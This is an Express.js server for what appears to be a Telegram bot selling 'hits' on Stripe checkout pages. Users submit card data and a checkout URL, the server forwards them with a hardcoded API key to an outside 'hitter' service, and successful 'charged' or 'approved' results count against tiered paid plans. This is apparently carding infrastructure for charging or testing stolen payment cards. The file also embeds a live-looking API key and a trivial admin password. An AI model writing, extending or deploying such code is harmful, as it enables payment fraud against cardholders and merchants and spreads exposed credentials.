const express = require('express');
const path = require('path');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 3000;

const axios = require('axios');

// Serve static files from the current directory
const fs = require('fs');

// Serve static files from the current directory
app.use(express.static(__dirname));
app.use(express.json({ limit: '50mb' })); // Increase limit for mass cards

// --- DATABASE LOGIC ---
// To persist on Render, mount a disk at /data and move database.json there
const DATA_DIR = fs.existsSync('/data') ? '/data' : __dirname;
const DB_FILE = path.join(DATA_DIR, 'database.json');

function readDB() {
  try {
    if (!fs.existsSync(DB_FILE)) {
      fs.writeFileSync(DB_FILE, JSON.stringify({ users: {}, redeem_codes: {} }, null, 2));
    }
    const data = fs.readFileSync(DB_FILE, 'utf8');
    return JSON.parse(data);
  } catch (err) {
    console.error('Error reading DB:', err);
    // Return empty if file is corrupt to prevent crash
    return { users: {}, redeem_codes: {} };
  }
}

function writeDB(data) {
  try {
    // Atomic-like write: first write to temp, then rename (if possible) 
    // for simplicity, just direct write here for now
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error('Error writing DB:', err);
  }
}

// Daily Limit Reset Logic
function checkDailyReset(user) {
  const today = new Date().toDateString();
  if (user.last_hit_date !== today) {
    user.hits_today = 0;
    user.last_hit_date = today;
    return true;
  }
  return false;
}

// Check Plan Expiry
function checkPlanExpiry(user) {
  if (user.plan !== 'free' && user.expiry) {
    if (new Date() > new Date(user.expiry)) {
      user.plan = 'free';
      user.expiry = null;
      return true;
    }
  }
  return false;
}

// Link Analysis Endpoint (Updated to use User's Local Extraction API)
app.post('/analyze-link', async (req, res) => {
  let { url } = req.body;
  if (!url || !url.includes('stripe.com')) {
    return res.status(400).json({ error: 'Invalid Stripe URL' });
  }

  // We MUST use the full URL as requested by the user (do not split on #)
  url = url.trim();

  const apiUrl = 'https://nonburnable-undolorously-sheilah.ngrok-free.dev/api/extract';

  try {
    console.log(`[Link Analysis] Fetching: ${url}`);
    
    const response = await axios.post(apiUrl, {
        url: url
    }, {
        headers: { 'Content-Type': 'application/json' },
        timeout: 20000 // Extended timeout for scraping
    });

    const data = response.data;
    console.log('[Link Analysis] Response:', JSON.stringify(data));

    // Mapping exact keys from user's API response: 'name' and 'price'
    let siteName = data.name || data.merchant || 'Stripe Checkout';
    let amountStr = data.price || data.amount || 'Unknown';

    // Clean up if there are escaped slashes/characters (e.g., Back\na2e.ai -> Backna2e.ai)
    if (siteName && typeof siteName === 'string') {
        siteName = siteName.replace(/\\n/g, '').replace(/\\/g, '').trim();
    }

    res.json({ 
        site: siteName, 
        amount: amountStr 
    });


  } catch (err) {
    console.error('Analysis failed:', err.message);
    
    // Fallback message to prevent app from breaking
    res.status(500).json({ 
        error: 'Extraction service unavailable',
        details: err.message
    });
  }
});


// --- USER & HIT MANAGEMENT ---

// Get User Plan Info
app.post('/get-user-info', (req, res) => {
  const { chatId } = req.body;
  if (!chatId) return res.status(400).json({ error: 'Chat ID required' });

  const db = readDB();
  let user = db.users[chatId];

  if (!user) {
    user = {
      plan: 'free',
      hits_today: 0,
      last_hit_date: new Date().toDateString(),
      expiry: null
    };
    db.users[chatId] = user;
    writeDB(db);
  }

  checkDailyReset(user);
  checkPlanExpiry(user);
  writeDB(db);

  res.json({
    chatId,
    plan: user.plan,
    hitsToday: user.hits_today,
    maxHits: user.plan === 'free' ? 2 : 'Unlimited',
    expiry: user.expiry
  });
});

// Hit Proxy with Limit Checks
app.post('/hit-proxy/:gate', async (req, res) => {
  const { gate } = req.params;
  const { chatId, card, url } = req.body;

  if (!chatId || !card || !url) {
    return res.status(400).json({ error: 'Missing parameters (chatId, card, or url)' });
  }

  const db = readDB();
  const user = db.users[chatId];

  if (!user) {
    return res.status(403).json({ error: 'User not registered. Please login.' });
  }

  checkDailyReset(user);
  checkPlanExpiry(user);

  // Enforce Limit for Free Plan
  if (user.plan === 'free' && user.hits_today >= 2) {
    return res.status(403).json({ 
      error: 'Limit Reached', 
      message: 'You have reached your daily limit of 2 hits. Upgrade to Silver/Gold for unlimited access!' 
    });
  }

  try {
    // UPDATED API KEY from your app.js
    const API_KEY = 'hitchk_e03920c069910b8939f63f77897e1f0ff463f60f8b623f06';
    const API_URL = 'https://hitter1month.replit.app';

    const response = await axios.post(`${API_URL}/hit/${gate}`, {
        url,
        card
    }, {
        headers: { 'X-API-Key': API_KEY, 'Content-Type': 'application/json' },
        timeout: 120000
    });

    const result = response.data;
    const status = (result.status || '').toLowerCase();

    // ONLY update Hit Count if the card was successfully CHARGED or APPROVED
    if (status === 'charged' || status === 'approved') {
        user.hits_today++;
        writeDB(db);
        console.log(`[Limit] Hit successful for ${chatId}. Hits today: ${user.hits_today}`);
    } else {
        console.log(`[Limit] Hit declined for ${chatId}. Limit not deducted.`);
    }

    res.json({
      ...result,
      remainingHits: user.plan === 'free' ? (2 - user.hits_today) : 'Unlimited'
    });

  } catch (err) {
    console.error('Hit Failed:', err.message);
    res.status(500).json({ error: 'System Error', message: err.message });
  }
});

// Redeem Code Endpoint
app.post('/redeem-code', (req, res) => {
  const { chatId, code } = req.body;
  if (!chatId || !code) return res.status(400).json({ error: 'Chat ID and Code required' });

  const db = readDB();
  const userData = db.users[chatId];
  const codeData = db.redeem_codes[code];

  if (!codeData || codeData.status !== 'active') {
    return res.status(400).json({ error: 'Invalid or Used Code' });
  }

  if (!userData) {
    return res.status(404).json({ error: 'User not found. Please login first.' });
  }

  // Set Plan and Expiry (Default 7 days)
  const expiryDate = new Date();
  expiryDate.setDate(expiryDate.getDate() + 7);

  userData.plan = codeData.plan;
  userData.expiry = expiryDate.toISOString();
  codeData.status = 'used';
  codeData.usedBy = chatId;

  writeDB(db);

  res.json({ 
    success: true, 
    plan: userData.plan, 
    expiry: userData.expiry,
    message: `Congratulations! Your ${userData.plan.toUpperCase()} plan is now active for 7 days!`
  });
});

// --- ADMIN ENDPOINTS ---
const ADMIN_PWD = 'admin123';

app.post('/admin/generate-code', (req, res) => {
  const { password, plan } = req.body;
  if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });

  const code = 'HIT-' + Math.random().toString(36).substring(2, 10).toUpperCase();
  const db = readDB();
  db.redeem_codes[code] = { plan, status: 'active', createdAt: new Date().toISOString() };
  writeDB(db);

  res.json({ code, plan });
});

app.post('/admin/users', (req, res) => {
  const { password } = req.body;
  if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
  const db = readDB();
  res.json(db.users);
});

// DIRECT Activation by Chat ID
app.post('/admin/update-user', (req, res) => {
  const { password, targetChatId, plan, duration } = req.body;
  if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
  if (!targetChatId || !plan) return res.status(400).json({ error: 'Chat ID and Plan required' });

  const db = readDB();
  let user = db.users[targetChatId];

  if (!user) {
    user = {
      plan: 'free',
      hits_today: 0,
      last_hit_date: new Date().toDateString(),
      expiry: null
    };
    db.users[targetChatId] = user;
  }

  user.plan = plan;
  
  if (duration === '7days') {
    const expiry = new Date();
    expiry.setDate(expiry.getDate() + 7);
    user.expiry = expiry.toISOString();
  } else if (duration === 'permanent') {
    user.expiry = null; // No expiry (continues until removed)
  }

  writeDB(db);
  res.json({ success: true, message: `User ${targetChatId} updated to ${plan.toUpperCase()} (${duration})` });
});

// Ping endpoint
app.get('/ping', (req, res) => {
  res.send('PONG');
});

// Send index.html for all routes to handle TWA correctly
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Self-ping to prevent Render sleeping
function startKeepAlive() {
  const url = process.env.RENDER_EXTERNAL_URL;
  if (url) {
    console.log(`Keep-alive started for: ${url}`);
    setInterval(() => {
      https.get(`${url}/ping`, (res) => {
        console.log(`Self-ping status: ${res.statusCode}`);
      }).on('error', (err) => {
        console.error(`Self-ping failed: ${err.message}`);
      });
    }, 14 * 60 * 1000); // 14 minutes (Render sleeps after 15)
  }
}

const bot = require('./bot');

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
  console.log(`Open http://localhost:${PORT} to view your app`);
  startKeepAlive();
  
  // Launch Bot
  bot.launch()
    .then(() => {
      console.log('✅ Telegram Bot is active!');
    })
    .catch(err => {
      console.error('❌ Telegram Bot Error:', err.message);
      console.log('⚠️ Server will continue running without the bot.');
    });

  // Enable graceful stop
  process.once('SIGINT', () => bot.stop('SIGINT'));
  process.once('SIGTERM', () => bot.stop('SIGTERM'));
});
